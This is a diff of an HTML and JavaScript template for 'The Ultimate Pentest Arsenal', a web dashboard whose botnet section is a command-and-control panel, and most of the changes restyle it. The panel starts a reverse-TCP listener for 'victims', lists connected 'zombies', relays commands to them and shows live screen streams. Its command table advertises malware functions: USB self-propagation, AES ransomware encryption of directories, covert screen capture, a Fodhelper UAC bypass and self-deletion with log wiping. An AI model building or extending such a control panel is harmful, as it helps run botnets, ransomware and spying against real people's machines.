@@ -4,93 +4,137 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>The Ultimate Pentest Arsenal - Elite UI</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-color: #0b0f19;
-            --sidebar-bg: #111827;
-            --card-bg: rgba(31, 41, 55, 0.7);
-            --border-color: #374151;
-            --text-color: #e5e7eb;
-            --accent-color: #3b82f6;
-            --accent-glow: rgba(59, 130, 246, 0.5);
-            --danger-color: #ef4444;
-            --success-color: #10b981;
-            --terminal-bg: #000000;
-            --terminal-text: #22c55e;
+            --bg-color: #050505;
+            --sidebar-bg: rgba(10, 10, 15, 0.85);
+            --card-bg: rgba(20, 20, 25, 0.6);
+            --border-color: #2a2a35;
+            --text-color: #e2e8f0;
+            --accent-primary: #ff003c; /* Cyberpunk Red */
+            --accent-secondary: #00f0ff; /* Cyberpunk Blue */
+            --danger-color: #ff003c;
+            --success-color: #39ff14; /* Neon Green */
+            --terminal-bg: rgba(5, 5, 5, 0.9);
+            --terminal-text: #39ff14;
+            --glass-blur: blur(12px);
         }
 
         body {
             margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', sans-serif;
             background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(255, 0, 60, 0.08), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(0, 240, 255, 0.08), transparent 25%);
             color: var(--text-color);
             display: flex;
             height: 100vh;
             overflow: hidden;
         }
 
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-primary); }
+
         /* Sidebar */
         .sidebar {
             width: 280px;
-            background-color: var(--sidebar-bg);
+            background: var(--sidebar-bg);
+            backdrop-filter: var(--glass-blur);
             border-right: 1px solid var(--border-color);
             display: flex;
             flex-direction: column;
-            box-shadow: 4px 0 15px rgba(0,0,0,0.5);
+            box-shadow: 5px 0 25px rgba(0,0,0,0.8);
             z-index: 10;
         }
 
         .sidebar-header {
-            padding: 20px;
+            padding: 25px 20px;
             text-align: center;
             border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .sidebar-header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px; left: 0; right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--accent-primary), transparent);
         }
 
         .sidebar-header h1 {
             margin: 0;
-            font-size: 1.2rem;
-            color: var(--danger-color);
+            font-size: 1.4rem;
+            color: #fff;
             text-transform: uppercase;
             letter-spacing: 2px;
-            font-family: monospace;
-            text-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
+            font-weight: 800;
+            text-shadow: 0 0 15px var(--accent-primary);
+        }
+        
+        .sidebar-header h1 i { color: var(--accent-primary); }
+
+        .status-badge {
+            display: inline-block;
+            font-size: 0.65rem;
+            color: var(--bg-color);
+            background: var(--success-color);
+            padding: 3px 8px;
+            border-radius: 12px;
+            margin-top: 10px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            box-shadow: 0 0 10px var(--success-color);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 5px var(--success-color); }
+            50% { box-shadow: 0 0 15px var(--success-color); }
+            100% { box-shadow: 0 0 5px var(--success-color); }
         }
 
         .sidebar-menu {
             flex: 1;
             overflow-y: auto;
-            padding: 15px 0;
-        }
-
-        .menu-category {
-            padding: 10px 20px;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            color: #6b7280;
-            font-weight: bold;
-            margin-top: 10px;
+            padding: 20px 0;
         }
 
         .menu-item {
-            padding: 12px 20px;
+            padding: 12px 25px;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex;
             align-items: center;
-            gap: 10px;
-            color: #d1d5db;
+            gap: 15px;
+            color: #94a3b8;
+            font-weight: 600;
+            font-size: 0.9rem;
+            border-left: 3px solid transparent;
         }
 
         .menu-item:hover, .menu-item.active {
-            background-color: rgba(59, 130, 246, 0.1);
-            color: var(--accent-color);
-            border-left: 3px solid var(--accent-color);
+            background: linear-gradient(90deg, rgba(255, 0, 60, 0.1), transparent);
+            color: #fff;
+            border-left: 3px solid var(--accent-primary);
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
         }
 
         .menu-item i {
             width: 20px;
             text-align: center;
+            font-size: 1.1rem;
+            transition: color 0.3s;
+        }
+        
+        .menu-item:hover i, .menu-item.active i {
+            color: var(--accent-secondary);
         }
 
         /* Main Content */
@@ -98,187 +142,224 @@
             flex: 1;
             display: flex;
             flex-direction: column;
-            background: radial-gradient(circle at top right, #111827, #0b0f19);
+            position: relative;
         }
 
         .topbar {
-            height: 60px;
+            height: 70px;
             border-bottom: 1px solid var(--border-color);
             display: flex;
             align-items: center;
-            padding: 0 20px;
-            background-color: rgba(17, 24, 39, 0.8);
-            backdrop-filter: blur(10px);
+            padding: 0 30px;
+            background: rgba(5, 5, 5, 0.7);
+            backdrop-filter: var(--glass-blur);
+            z-index: 5;
         }
 
         .topbar h2 {
             margin: 0;
-            font-size: 1.2rem;
-            font-weight: 500;
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
+        
+        .topbar h2 i { color: var(--accent-secondary); }
 
         .content-area {
             flex: 1;
-            padding: 20px;
+            padding: 30px;
             overflow-y: auto;
             display: flex;
             flex-direction: column;
-            gap: 20px;
+            gap: 25px;
         }
 
-        /* Cards */
+        /* Cards & Grids */
         .tools-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 25px;
         }
 
         .card {
-            background-color: var(--card-bg);
+            background: var(--card-bg);
             border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            backdrop-filter: blur(10px);
-            transition: transform 0.2s, box-shadow 0.2s;
+            border-radius: 12px;
+            padding: 25px;
+            backdrop-filter: var(--glass-blur);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; height: 2px;
-            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .card:hover::before {
-            opacity: 1;
         }
 
         .card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
-            border-color: var(--accent-color);
+            transform: translateY(-5px);
+            border-color: rgba(0, 240, 255, 0.5);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.6), 0 0 15px rgba(0, 240, 255, 0.1);
         }
 
         .card h3 {
             margin-top: 0;
-            color: #f3f4f6;
-            font-size: 1.1rem;
+            color: #fff;
+            font-size: 1.15rem;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             border-bottom: 1px solid var(--border-color);
-            padding-bottom: 10px;
+            padding-bottom: 12px;
+            margin-bottom: 15px;
         }
+        
+        .card h3 i { color: var(--accent-primary); }
 
         .card p {
-            font-size: 0.9rem;
-            color: #9ca3af;
-            margin-bottom: 15px;
-            min-height: 40px;
+            font-size: 0.85rem;
+            color: #cbd5e1;
+            margin-bottom: 20px;
+            line-height: 1.6;
         }
 
         /* Forms */
         .form-group {
-            margin-bottom: 12px;
+            margin-bottom: 15px;
         }
 
         .form-group label {
             display: block;
-            font-size: 0.8rem;
-            margin-bottom: 4px;
-            color: #9ca3af;
+            font-size: 0.75rem;
+            margin-bottom: 6px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
         }
 
         .form-control {
             width: 100%;
-            padding: 10px;
-            background-color: #111827;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.5);
             border: 1px solid var(--border-color);
-            color: white;
-            border-radius: 4px;
+            color: #fff;
+            border-radius: 6px;
             box-sizing: border-box;
-            font-family: monospace;
-            transition: border-color 0.2s;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            transition: all 0.3s;
         }
 
         .form-control:focus {
             outline: none;
-            border-color: var(--accent-color);
-            box-shadow: 0 0 0 2px var(--accent-glow);
+            border-color: var(--accent-secondary);
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
+            background: rgba(0, 0, 0, 0.8);
         }
 
         .btn {
             width: 100%;
-            padding: 10px;
-            background-color: transparent;
-            border: 1px solid var(--accent-color);
-            color: var(--accent-color);
-            border-radius: 4px;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid var(--accent-primary);
+            color: var(--accent-primary);
+            border-radius: 6px;
             cursor: pointer;
-            font-weight: bold;
-            transition: all 0.2s;
-            margin-top: 10px;
+            font-weight: 800;
+            transition: all 0.3s;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            font-size: 0.8rem;
+            letter-spacing: 2px;
+            font-size: 0.85rem;
+            position: relative;
+            overflow: hidden;
         }
 
         .btn:hover {
-            background-color: var(--accent-color);
-            color: white;
-            box-shadow: 0 0 10px var(--accent-glow);
+            background: var(--accent-primary);
+            color: #fff;
+            box-shadow: 0 0 20px rgba(255, 0, 60, 0.4);
         }
+
+        .btn:disabled {
+            border-color: #475569;
+            color: #475569;
+            cursor: not-allowed;
+        }
+        .btn:disabled:hover { background: transparent; box-shadow: none; }
 
         /* Terminal */
         .terminal-container {
             margin-top: auto;
-            border: 1px solid #333;
-            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
             overflow: hidden;
             display: flex;
             flex-direction: column;
-            background-color: var(--terminal-bg);
-            box-shadow: 0 0 20px rgba(0,0,0,0.8);
-            height: 300px;
+            background: var(--terminal-bg);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.9);
+            height: 350px;
+            backdrop-filter: var(--glass-blur);
         }
 
         .terminal-header {
-            background-color: #1f2937;
-            padding: 8px 15px;
+            background: rgba(20, 20, 25, 0.9);
+            padding: 10px 20px;
             font-size: 0.8rem;
-            color: #9ca3af;
+            color: #94a3b8;
             display: flex;
             justify-content: space-between;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid var(--border-color);
+            font-family: 'JetBrains Mono', monospace;
         }
 
         .terminal-content {
-            padding: 15px;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.9rem;
+            padding: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
             color: var(--terminal-text);
             overflow-y: auto;
             flex: 1;
             white-space: pre-wrap;
-            line-height: 1.4;
+            line-height: 1.5;
         }
 
-        .terminal-content .spinner {
-            display: inline-block;
-            animation: spin 1s linear infinite;
+        #bot-cmd-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #fff;
+            padding: 15px 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            outline: none;
         }
+        
+        .botnet-cmd-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            font-size: 0.85rem;
+        }
+        .botnet-cmd-table th, .botnet-cmd-table td {
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            text-align: left;
+        }
+        .botnet-cmd-table th { background: rgba(255, 0, 60, 0.1); color: var(--accent-primary); }
+        .botnet-cmd-table td code { color: var(--accent-secondary); font-family: 'JetBrains Mono', monospace; }
 
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 8px; height: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-color); }
-        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
+        /* Modals */
+        #stream-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column;
+            align-items: center; justify-content: center; backdrop-filter: blur(5px);
+        }
+        
+        .zombie-item {
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(0,0,0,0.4); padding: 15px; border-radius: 8px;
+            border-left: 4px solid var(--accent-primary); transition: all 0.2s;
+        }
+        .zombie-item:hover { background: rgba(255, 0, 60, 0.05); }
 
     </style>
 </head>
@@ -286,15 +367,15 @@
 
     <div class="sidebar">
         <div class="sidebar-header">
-            <h1><i class="fa-solid fa-skull"></i> Arsenal UI</h1>
-            <div style="font-size: 0.7rem; color: var(--success-color); margin-top: 5px;">● SYSTEM ONLINE</div>
+            <h1><i class="fa-solid fa-skull-crossbones"></i> Arsenal</h1>
+            <div class="status-badge">SYSTEM ONLINE</div>
         </div>
         <div class="sidebar-menu" id="sidebar-menu">
             <div class="menu-item" id="menu-item-botnet" onclick="renderBotnet()">
                 <i class="fa-solid fa-spider"></i>
-                <span style="color: var(--danger-color); font-weight: bold;">Zombies (C2 Botnet)</span>
+                <span style="color: var(--accent-primary); font-weight: 800;">Zombies (Botnet)</span>
             </div>
-            <div style="border-bottom: 1px solid #333; margin: 10px 0;"></div>
+            <div style="border-bottom: 1px solid var(--border-color); margin: 15px 0;"></div>
             <div id="dynamic-menu"></div>
         </div>
     </div>
@@ -305,19 +386,42 @@
         </div>
         
         <div class="content-area">
-            <div id="botnet-container" style="display: none; flex-direction: column; gap: 20px;">
-                <div class="card" style="border-color: var(--danger-color);">
-                    <h3><i class="fa-solid fa-network-wired"></i> C2 Listener Control</h3>
-                    <p>Web tabanlı C2 Listener'ı başlatın. Kurbanlar bu porta bağlanacaktır.</p>
-                    <div style="display: flex; gap: 10px;">
-                        <input type="text" id="c2-port-input" class="form-control" placeholder="Dinlenecek Port (Örn: 443)" value="443" style="width: 200px;">
-                        <button class="btn" style="width: auto;" onclick="startC2Listener()"><i class="fa-solid fa-play"></i> Dinlemeyi Başlat</button>
+            
+            <div id="botnet-container" style="display: none; flex-direction: column; gap: 25px;">
+                <div style="display: grid; grid-template-columns: 1fr 2fr; gap: 25px;">
+                    <div class="card" style="border-color: var(--accent-primary);">
+                        <h3><i class="fa-solid fa-satellite-dish"></i> C2 Listener Control</h3>
+                        <p>Web tabanlı C2 Listener'ı başlatın. Kurbanlar doğrudan bu sunucuya ters bağlantı (Reverse TCP) kuracaktır.</p>
+                        <div class="form-group">
+                            <label>Dinlenecek Port</label>
+                            <input type="text" id="c2-port-input" class="form-control" placeholder="Örn: 443" value="443">
+                        </div>
+                        <button class="btn" onclick="startC2Listener()"><i class="fa-solid fa-power-off"></i> Dinlemeyi Başlat</button>
+                    </div>
+                    
+                    <div class="card">
+                        <h3><i class="fa-solid fa-book-skull"></i> God-Tier Botnet Commands</h3>
+                        <p>Hedefe bağlandıktan sonra terminale (aşağıdaki input alanına) yazabileceğiniz özel modül komutları:</p>
+                        <table class="botnet-cmd-table">
+                            <tr><th>Komut</th><th>Açıklama / Etki</th></tr>
+                            <tr><td><code>!spread</code></td><td>USB bellekleri bulur, kendini kopyalar ve bulaşır.</td></tr>
+                            <tr><td><code>!ransom &lt;dizin&gt;</code></td><td>Belirtilen dizindeki her şeyi AES ile şifreler.</td></tr>
+                            <tr><td><code>!stream_start</code></td><td>Arka planda ekran görüntüleri alır, canlı yayınlar.</td></tr>
+                            <tr><td><code>!stream_stop</code></td><td>Canlı ekran yayınını durdurur.</td></tr>
+                            <tr><td><code>!autoroot</code></td><td>Fodhelper UAC bypass ile Yönetici hakları alır.</td></tr>
+                            <tr><td><code>!suicide</code></td><td>Virüsü diskten siler, logları temizler, bağlantı koparır.</td></tr>
+                            <tr><td><code>whoami, dir</code></td><td>Tüm standart Windows CMD komutları geçerlidir.</td></tr>
+                        </table>
                     </div>
                 </div>
-                <div class="card">
-                    <h3><i class="fa-solid fa-users-viewfinder"></i> Active Zombies <span id="bot-count" style="background: var(--danger-color); padding: 2px 8px; border-radius: 10px; font-size: 0.8rem; margin-left: auto;">0</span></h3>
-                    <div id="bots-list" style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
-                        <!-- Bots will be listed here -->
+
+                <div class="card" style="min-height: 200px;">
+                    <h3><i class="fa-solid fa-users-crosshairs"></i> Active Zombies <span id="bot-count" style="background: var(--accent-primary); padding: 2px 10px; border-radius: 12px; font-size: 0.8rem; margin-left: auto;">0</span></h3>
+                    <div id="bots-list" style="display: flex; flex-direction: column; gap: 12px; margin-top: 15px;">
+                        <div style="color: #64748b; font-size: 0.9rem; text-align: center; padding: 20px;">
+                            <i class="fa-solid fa-satellite fa-2x" style="opacity: 0.5; margin-bottom: 10px;"></i><br>
+                            Dinleme başlatılmadı veya bağlı kurban yok.
+                        </div>
                     </div>
                 </div>
             </div>
@@ -328,35 +432,34 @@
 
             <div class="terminal-container" id="terminal-container">
                 <div class="terminal-header">
-                    <span id="term-prompt"><i class="fa-solid fa-terminal"></i> root@arsenal:~#</span>
-                    <span id="term-status" style="color: var(--success-color);">Idle</span>
+                    <span id="term-prompt" style="color: var(--accent-secondary);"><i class="fa-solid fa-terminal"></i> root@arsenal:~#</span>
+                    <span id="term-status" style="color: var(--success-color);"><i class="fa-solid fa-circle-check"></i> System Idle</span>
                 </div>
                 <div class="terminal-content" id="terminal-content">
-The Ultimate Pentest Arsenal - Web Dashboard v6.0
-Initialize sequence completed. Awaiting commands...
+[+] The Ultimate Pentest Arsenal - Web Dashboard v7.0
+[+] Cyberpunk UI Loaded. Glassmorphism Engine Active.
+[+] Initialize sequence completed. Awaiting commands...
                 </div>
-                <div style="display: flex; border-top: 1px solid #333; background: #000;">
-                    <input type="text" id="bot-cmd-input" placeholder="Komut yazın (örn: !spread, !ransom, dir, whoami)..." style="flex:1; background: transparent; border: none; color: var(--terminal-text); padding: 10px; font-family: monospace; outline: none; display: none;" onkeypress="handleBotCmd(event)">
+                <div style="display: flex; border-top: 1px solid var(--border-color); background: rgba(0,0,0,0.5);">
+                    <input type="text" id="bot-cmd-input" placeholder="Komut yazın (örn: !spread, !ransom, dir)... ve Enter'a basın" autocomplete="off" onkeypress="handleBotCmd(event)">
                 </div>
             </div>
             
             <!-- Live Stream Modal -->
-            <div id="stream-modal" style="display:none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.9); z-index: 1000; flex-direction: column; align-items: center; justify-content: center;">
-                <div style="width: 80%; display: flex; justify-content: space-between; margin-bottom: 10px;">
-                    <h3 style="color: var(--danger-color); margin: 0;"><i class="fa-solid fa-video"></i> Live Screen Stream</h3>
-                    <button onclick="document.getElementById('stream-modal').style.display='none'" class="btn" style="width: auto; padding: 5px 15px;">Kapat</button>
+            <div id="stream-modal">
+                <div style="width: 85%; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                    <h3 style="color: var(--accent-primary); margin: 0; font-family: 'JetBrains Mono';"><i class="fa-solid fa-video"></i> LIVE TARGET STREAM</h3>
+                    <button onclick="document.getElementById('stream-modal').style.display='none'" class="btn" style="width: auto; padding: 8px 20px; border-color: #fff; color: #fff;">Close View</button>
                 </div>
-                <img id="stream-img" src="" style="max-width: 80%; max-height: 80vh; border: 2px solid var(--accent-color); border-radius: 8px;">
+                <img id="stream-img" src="" style="max-width: 85%; max-height: 80vh; border: 2px solid var(--accent-secondary); box-shadow: 0 0 30px rgba(0, 240, 255, 0.3); border-radius: 8px;">
             </div>
 
         </div>
     </div>
 
     <script>
-        // Sunucudan gelen JSON config
         const CONFIG = {{ tools_config | safe }};
         
-        const sidebarMenu = document.getElementById('sidebar-menu');
         const toolsGrid = document.getElementById('tools-grid');
         const topbarTitle = document.getElementById('topbar-title');
         const termContent = document.getElementById('terminal-content');
@@ -371,32 +474,26 @@ Initialize sequence completed. Awaiting commands...
             termContent.scrollTop = termContent.scrollHeight;
         }
 
-        function clearTerminal() {
-            termContent.innerHTML = "";
-        }
-
         function runTool(toolId, btnElement) {
-            // İlgili formu bul
             const form = document.getElementById(`form-${toolId}`);
             const formData = new FormData(form);
             const args = {};
             formData.forEach((value, key) => { args[key] = value; });
 
-            // UI Güncelle
             const originalBtnText = btnElement.innerHTML;
-            btnElement.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Çalışıyor...';
+            btnElement.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Executing...';
             btnElement.disabled = true;
-            termStatus.innerText = "Running...";
-            termStatus.style.color = "var(--warning-color)";
+            termStatus.innerHTML = '<i class="fa-solid fa-cog fa-spin"></i> Running';
+            termStatus.style.color = "orange";
             
-            appendToTerminal(`\n[+] Executing module [${toolId}]...`);
+            appendToTerminal(`\n<span style="color:var(--accent-secondary)">[~] Executing module [${toolId}]...</span>`, true);
 
             fetch('/api/run', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ tool_id: toolId, args: args })
             })
-            .then(response => response.json())
+            .then(r => r.json())
             .then(data => {
                 if(data.status === "success") {
                     appendToTerminal(data.output);
@@ -410,7 +507,7 @@ Initialize sequence completed. Awaiting commands...
             .finally(() => {
                 btnElement.innerHTML = originalBtnText;
                 btnElement.disabled = false;
-                termStatus.innerText = "Idle";
+                termStatus.innerHTML = '<i class="fa-solid fa-circle-check"></i> System Idle';
                 termStatus.style.color = "var(--success-color)";
             });
         }
@@ -425,7 +522,7 @@ Initialize sequence completed. Awaiting commands...
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ port: port })
             }).then(r => r.json()).then(d => {
-                appendToTerminal(`[C2] ${d.message}`);
+                appendToTerminal(`\n<span style="color:var(--accent-primary)">[C2] ${d.message}</span>`, true);
                 pollBots();
             });
         }
@@ -439,16 +536,19 @@ Initialize sequence completed. Awaiting commands...
                         const botsList = document.getElementById('bots-list');
                         botsList.innerHTML = '';
                         if(d.bots.length === 0) {
-                            botsList.innerHTML = '<div style="color: #6b7280; font-size: 0.9rem;">Bağlı kurban bulunmuyor.</div>';
+                            botsList.innerHTML = '<div style="color: #64748b; font-size: 0.9rem; text-align: center; padding: 20px;"><i class="fa-solid fa-satellite fa-2x" style="opacity: 0.5; margin-bottom: 10px;"></i><br>Dinleme aktif. Kurban bağlantısı bekleniyor...</div>';
                         }
                         d.bots.forEach(bot => {
+                            const isCurrent = (currentBotId === bot.id);
                             botsList.innerHTML += `
-                                <div style="display: flex; justify-content: space-between; align-items: center; background: #1f2937; padding: 10px; border-radius: 6px; border-left: 3px solid var(--danger-color);">
+                                <div class="zombie-item" style="${isCurrent ? 'border-color: var(--accent-secondary); background: rgba(0, 240, 255, 0.1);' : ''}">
                                     <div>
-                                        <strong><i class="fa-solid fa-desktop"></i> Zombie_${bot.id}</strong>
-                                        <div style="font-size: 0.8rem; color: #9ca3af;">IP: ${bot.ip}:${bot.port}</div>
+                                        <strong style="color: #fff; font-family: 'JetBrains Mono';"><i class="fa-solid fa-skull"></i> Zombie_${bot.id}</strong>
+                                        <div style="font-size: 0.8rem; color: #94a3b8; font-family: 'JetBrains Mono'; margin-top: 4px;">IP: ${bot.ip}:${bot.port}</div>
                                     </div>
-                                    <button class="btn" style="width: auto; padding: 5px 15px;" onclick="interactBot('${bot.id}')">Interact</button>
+                                    <button class="btn" style="width: auto; padding: 8px 20px; font-size: 0.75rem;" onclick="interactBot('${bot.id}')">
+                                        <i class="fa-solid fa-terminal"></i> INTERACT
+                                    </button>
                                 </div>
                             `;
                         });
@@ -466,7 +566,8 @@ Initialize sequence completed. Awaiting commands...
                                 currentBotId = null;
                                 document.getElementById('bot-cmd-input').style.display = 'none';
                                 document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
-                                appendToTerminal("[C2] Bot connection lost.");
+                                document.getElementById('term-prompt').style.color = "var(--accent-secondary)";
+                                appendToTerminal(`\n<span style="color:var(--accent-primary)">[C2] Kurban ile bağlantı koptu.</span>`, true);
                             }
                         });
                     }
@@ -477,8 +578,10 @@ Initialize sequence completed. Awaiting commands...
         function interactBot(botId) {
             currentBotId = botId;
             document.getElementById('bot-cmd-input').style.display = 'block';
-            document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-skull"></i> zombie_${botId}:~#`;
-            appendToTerminal(`\n[+] Interacting with zombie_${botId}... Type '!help' or commands.`);
+            document.getElementById('bot-cmd-input').focus();
+            document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-skull-crossbones"></i> zombie_${botId}:~#`;
+            document.getElementById('term-prompt').style.color = "var(--accent-primary)";
+            appendToTerminal(`\n<span style="color:var(--success-color)">[+] Interacting with zombie_${botId}... Type '!help' or commands.</span>`, true);
         }
 
         function handleBotCmd(e) {
@@ -500,7 +603,7 @@ Initialize sequence completed. Awaiting commands...
         }
 
         function renderBotnet() {
-            topbarTitle.innerHTML = `<i class="fa-solid fa-spider"></i> Zombies (Botnet Control)`;
+            topbarTitle.innerHTML = `<i class="fa-solid fa-spider"></i> Botnet Control Center`;
             document.getElementById('tools-grid').style.display = 'none';
             document.getElementById('botnet-container').style.display = 'flex';
             
@@ -510,6 +613,7 @@ Initialize sequence completed. Awaiting commands...
             currentBotId = null;
             document.getElementById('bot-cmd-input').style.display = 'none';
             document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
+            document.getElementById('term-prompt').style.color = "var(--accent-secondary)";
             pollBots();
         }
 
@@ -519,6 +623,7 @@ Initialize sequence completed. Awaiting commands...
             currentBotId = null;
             document.getElementById('bot-cmd-input').style.display = 'none';
             document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
+            document.getElementById('term-prompt').style.color = "var(--accent-secondary)";
             
             const category = CONFIG[categoryIndex];
             topbarTitle.innerHTML = `<i class="fa-solid ${category.icon}"></i> ${category.category}`;
@@ -544,7 +649,7 @@ Initialize sequence completed. Awaiting commands...
                         <form id="form-${tool.id}" onsubmit="event.preventDefault();">
                             ${inputsHTML}
                             <button type="button" class="btn" onclick="runTool('${tool.id}', this)">
-                                <i class="fa-solid fa-play"></i> Çalıştır
+                                <i class="fa-solid fa-bolt"></i> LAUNCH
                             </button>
                         </form>
                     </div>
@@ -552,7 +657,6 @@ Initialize sequence completed. Awaiting commands...
                 toolsGrid.innerHTML += cardHTML;
             });
 
-            // Active class update
             document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
             document.getElementById(`menu-item-${categoryIndex}`).classList.add('active');
         }
@@ -568,15 +672,10 @@ Initialize sequence completed. Awaiting commands...
                     </div>
                 `;
             });
-            // İlk kategoriyi aç
-            if(CONFIG.length > 0) {
-                renderCategory(0);
-            }
+            if(CONFIG.length > 0) renderCategory(0);
         }
 
-        // Başlat
         initSidebar();
-
     </script>
 </body>
 </html>
